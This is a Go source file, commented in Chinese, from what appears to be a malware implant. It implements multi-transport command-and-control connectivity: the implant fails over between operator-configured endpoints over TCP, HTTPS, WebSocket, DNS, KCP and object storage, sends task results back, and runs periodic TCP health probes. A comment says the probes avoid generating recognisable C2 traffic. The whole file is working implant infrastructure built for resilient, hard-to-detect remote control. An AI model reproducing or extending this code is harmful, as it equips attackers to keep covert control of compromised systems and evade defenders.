//go:build transport_multi

package main

import (
	"errors"
	"fmt"
	"implant/core/app"
	"implant/core/debuglog"
	"implant/core/reconnect"
	"net"
	"strings"
	"sync"
	"time"
)

// 单二进制多传输（阶段三 · 第 15 项）。
//
// 装一个二进制、配一组端点（scheme://addr,...），运行时按 endpoint 的 scheme
// 选择传输实现；某个端点连不上时 runloop 会调用 app.AdvanceEndpoint() 轮转到
// 下一个端点——下一个端点可以是完全不同的传输（tcp → https → dns）。
//
// 为什么不在 Connect 内部再枚举一遍 scheme 回退：端点顺序就是操作员定义的回退顺序，
// 一个端点对应一种传输；runloop 的下一轮重连自然会试下一个端点。在 Connect 里
// 额外猜测"这个地址也许能用另一种协议"只会制造难以诊断的连接行为。

func init() {
	newMultiTransportFn = func() transportClient { return newMultiTransport() }
}

type multiTransport struct {
	mu           sync.Mutex
	active       transportClient
	activeScheme string
	reconnectMgr *reconnect.ReconnectManager
	health       *healthTracker
	proberOnce   sync.Once
}

func newMultiTransport() *multiTransport {
	m := &multiTransport{reconnectMgr: reconnect.NewReconnectManager(), health: newHealthTracker()}
	// 活动端点连续探测失败 → 主动断开，让 runloop 立即重连（选择器会挑健康端点）
	m.health.onActiveUnhealthy = func(ep string) {
		debuglog.Printf("🩺 [MULTI] 活动端点 %s 连续探测失败，主动断开并切换\n", ep)
		_ = m.Close()
	}
	return m
}

// splitEndpoint 拆分 scheme://address，并归一化 scheme 别名
func splitEndpoint(host string) (scheme, addr string, err error) {
	idx := strings.Index(host, "://")
	if idx <= 0 {
		return "", "", fmt.Errorf("多传输端点的格式必须是 scheme://address，收到 %q", host)
	}
	scheme = normalizeTransportScheme(host[:idx])
	addr = strings.TrimSpace(host[idx+3:])
	if addr == "" {
		return "", "", fmt.Errorf("端点 %q 缺少地址", host)
	}
	return scheme, addr, nil
}

// normalizeTransportScheme 归一化别名（服务端 listener 类型以 websocket 为准）
func normalizeTransportScheme(s string) string {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "ws", "websocket":
		return "websocket"
	default:
		return strings.ToLower(strings.TrimSpace(s))
	}
}

func (m *multiTransport) Connect(host string) error {
	// 主动健康探测：请求连接的端点不健康时，直接改用健康端点
	// （runloop 持有的 host 可能是探测前的旧值，这里以健康表为准）
	if !m.health.isHealthy(host) {
		if next := m.health.nextHealthy(host, m.health.endpointsFn()); next != "" && next != host {
			debuglog.Printf("🩺 [MULTI] 端点 %s 不健康，改用 %s\n", host, next)
			host = next
			app.SetCurrentEndpoint(next)
		}
	}

	scheme, addr, err := splitEndpoint(host)
	if err != nil {
		return err
	}
	ctor, ok := transportRegistry[scheme]
	if !ok {
		return fmt.Errorf("未知传输类型 %q（可用: %s）", scheme, strings.Join(registeredSchemes(), ","))
	}

	m.mu.Lock()
	prev := m.active
	m.active = nil
	m.mu.Unlock()
	if prev != nil {
		_ = prev.Close()
	}

	client := ctor()
	if err := client.Connect(addr); err != nil {
		m.health.record(host, false)
		return fmt.Errorf("[%s] 连接 %s 失败: %w", scheme, addr, err)
	}
	m.health.record(host, true)
	m.health.setActive(host)

	m.mu.Lock()
	m.active = client
	m.activeScheme = scheme
	m.mu.Unlock()

	// 注册健康选择器并启动周期探测（首次连接时）
	m.proberOnce.Do(func() {
		app.SetEndpointSelector(m.health.nextHealthy)
		m.health.startProber(m.health.endpointsFn)
	})

	// FirstBlood 里的类型与日志都用实际生效的传输
	listenerType = scheme
	debuglog.Printf("🔀 [MULTI] 当前传输: %s (%s)\n", scheme, addr)
	return nil
}

func (m *multiTransport) Recv() ([]byte, error) {
	c := m.current()
	if c == nil {
		return nil, errors.New("多传输调度器尚未连接")
	}
	return c.Recv()
}

func (m *multiTransport) SendResult(b64Packet []byte) error {
	c := m.current()
	if c == nil {
		return errors.New("多传输调度器尚未连接")
	}
	return c.SendResult(b64Packet)
}

func (m *multiTransport) Close() error {
	m.mu.Lock()
	c := m.active
	m.active = nil
	m.mu.Unlock()
	if c != nil {
		return c.Close()
	}
	return nil
}

func (m *multiTransport) IsConnected() bool {
	c := m.current()
	return c != nil && c.IsConnected()
}

func (m *multiTransport) ReconnectMgr() *reconnect.ReconnectManager { return m.reconnectMgr }

// Underlying 返回当前实际传输，供 runloop 判断轮询/持久型（见 runloop.go）
func (m *multiTransport) Underlying() transportClient { return m.current() }

// ActiveScheme 当前生效的传输类型（日志/诊断）
func (m *multiTransport) ActiveScheme() string {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.activeScheme
}

func (m *multiTransport) current() transportClient {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.active
}

// registeredSchemes 注册表里的传输类型（排序后用于错误提示）
func registeredSchemes() []string {
	out := make([]string, 0, len(transportRegistry))
	for k := range transportRegistry {
		out = append(out, k)
	}
	// 简单插入排序：类型数量固定且很少
	for i := 1; i < len(out); i++ {
		for j := i; j > 0 && out[j] < out[j-1]; j-- {
			out[j], out[j-1] = out[j-1], out[j]
		}
	}
	return out
}

// ===== 主动健康探测 =====
//
// 只靠"连接失败再回退"不够：半开连接（NAT 超时、上游中继假死、黑洞路由）上
// 写操作仍会成功，read 要等到超时，期间命令全部丢失。这里对**非活动端点**做
// 轻量 TCP 探测（真实流量本身就是活动端点的健康信号），并把探测结果用于两件事：
//   1. 轮转时优先选健康端点（而不是盲目试下一个）；
//   2. 活动端点连续探测失败时主动断开，让 runloop 立即重连到健康端点。
//
// 探测只做 TCP connect：不需要业务协议、不产生 C2 特征流量，失败即视为不可达。

const (
	// probeInterval 探测周期（变量便于测试缩短）
	probeInterval = 60 * time.Second
	// probeTimeout 单次探测超时
	probeTimeout = 3 * time.Second
	// probeFailThreshold 连续失败多少次判定为不健康
	probeFailThreshold = 2
)

// endpointHealth 单个端点的健康状态
type endpointHealth struct {
	failures  int
	lastOK    time.Time
	lastProbe time.Time
	latency   time.Duration
}

// healthTracker 端点健康表（并发安全）
type healthTracker struct {
	mu     sync.Mutex
	states map[string]*endpointHealth
	// probeFn 可注入（测试用）；默认 probeEndpoint
	probeFn func(ep string) bool
	// endpointsFn 返回全部端点（测试可注入；默认 app.AllEndpoints）
	endpointsFn func() []string
	// onActiveUnhealthy 活动端点判定不健康时的回调（由 multiTransport 注入：主动断开）
	onActiveUnhealthy func(ep string)
	active            string
	proberStarted     bool
}

func newHealthTracker() *healthTracker {
	return &healthTracker{
		states:      make(map[string]*endpointHealth),
		probeFn:     probeEndpoint,
		endpointsFn: app.AllEndpoints,
	}
}

func (h *healthTracker) state(ep string) *endpointHealth {
	st, ok := h.states[ep]
	if !ok {
		st = &endpointHealth{}
		h.states[ep] = st
	}
	return st
}

// record 记录一次端点使用结果（连接成功/失败）
func (h *healthTracker) record(ep string, ok bool) {
	if ep == "" {
		return
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	st := h.state(ep)
	if ok {
		st.failures = 0
		st.lastOK = time.Now()
		return
	}
	st.failures++
}

// setActive 记录当前活动端点（探测时跳过它：它的健康由真实流量反映）
func (h *healthTracker) setActive(ep string) {
	h.mu.Lock()
	h.active = ep
	h.mu.Unlock()
}

// isHealthy 端点是否健康。未探测过的端点视为健康（不因未知而回避）。
func (h *healthTracker) isHealthy(ep string) bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	st, ok := h.states[ep]
	if !ok {
		return true
	}
	return st.failures < probeFailThreshold
}

// nextHealthy 选择器实现：从当前端点之后循环，返回第一个健康端点；
// 没有健康端点时返回空串（调用方回退到顺序轮转）。
func (h *healthTracker) nextHealthy(current string, all []string) string {
	if len(all) == 0 {
		return ""
	}
	start := 0
	for i, e := range all {
		if e == current {
			start = i
			break
		}
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	for i := 1; i <= len(all); i++ {
		ep := all[(start+i)%len(all)]
		st, ok := h.states[ep]
		if !ok || st.failures < probeFailThreshold {
			return ep
		}
	}
	return ""
}

// probeAll 探测全部端点（测试与探测循环共用）。活动端点也要探：写成功但读不通的
// 黑洞路径只能靠探测或读超时发现，探测更快。
func (h *healthTracker) probeAll(endpoints []string) {
	h.mu.Lock()
	active := h.active
	probe := h.probeFn
	h.mu.Unlock()

	activeFailed := false
	for _, ep := range endpoints {
		ok := probe(ep)
		h.mu.Lock()
		st := h.state(ep)
		st.lastProbe = time.Now()
		if ok {
			st.failures = 0
			st.lastOK = time.Now()
		} else {
			st.failures++
		}
		if ep == active && st.failures >= probeFailThreshold {
			activeFailed = true
		}
		h.mu.Unlock()

		if ep != active {
			debuglog.Printf("🩺 [MULTI] 探测 %s: ok=%v (连续失败 %d)\n", ep, ok, func() int {
				h.mu.Lock()
				defer h.mu.Unlock()
				return h.state(ep).failures
			}())
		}
	}
	if activeFailed {
		h.mu.Lock()
		cb := h.onActiveUnhealthy
		h.mu.Unlock()
		if cb != nil {
			cb(active)
		}
	}
}

// startProber 启动周期探测（幂等）
func (h *healthTracker) startProber(endpointsFn func() []string) {
	h.mu.Lock()
	if h.proberStarted {
		h.mu.Unlock()
		return
	}
	h.proberStarted = true
	h.mu.Unlock()

	go func() {
		ticker := time.NewTicker(probeInterval)
		defer ticker.Stop()
		for range ticker.C {
			h.probeAll(endpointsFn())
		}
	}()
}

// probeEndpoint 默认探测实现：按 scheme 解析出 host:port 做 TCP 连接。
// 不可 TCP 探测的传输（KCP 是 UDP、DNS 是解析器地址、OSS 是对象存储地址格式）
// 视为健康——宁可漏判，也不要把正常端点误标为不可用。
func probeEndpoint(ep string) bool {
	scheme, addr, err := splitEndpoint(ep)
	if err != nil {
		return false
	}
	switch scheme {
	case "kcp", "kcp_forward", "dns", "oss":
		return true
	}
	// 去掉路径部分（https://cdn.example.com/api → cdn.example.com[/api]）
	host := addr
	if i := strings.IndexByte(host, '/'); i >= 0 {
		host = host[:i]
	}
	if host == "" {
		return false
	}
	if _, _, err := net.SplitHostPort(host); err != nil {
		// 没有显式端口：按 scheme 补默认端口；无默认端口的 scheme 无法探测，视为健康
		switch scheme {
		case "https", "websocket", "ws_forward", "https_forward":
			host = net.JoinHostPort(host, "443")
		case "http", "http_forward":
			host = net.JoinHostPort(host, "80")
		default:
			return true
		}
	}
	conn, err := net.DialTimeout("tcp", host, probeTimeout)
	if err != nil {
		return false
	}
	_ = conn.Close()
	return true
}
